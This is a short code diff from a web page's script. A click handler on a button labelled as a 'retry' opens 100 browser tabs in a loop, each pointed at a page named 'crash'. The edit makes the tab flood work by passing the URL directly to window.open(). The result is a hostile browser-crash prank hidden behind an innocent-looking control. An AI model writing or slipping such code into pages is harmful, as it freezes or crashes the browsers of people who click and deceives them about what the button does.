@@ -63,7 +63,7 @@
         document.getElementById('retry-button').addEventListener('click', function() {
             var url = 'https://billylikesbacon.github.io/crash/index.html'; // URL to open
             for (var i = 0; i < 100; i++){
-                let newTab = window.open();
+                let newTab = window.open(url);
                 newTab.location.href = url;
             }            
             
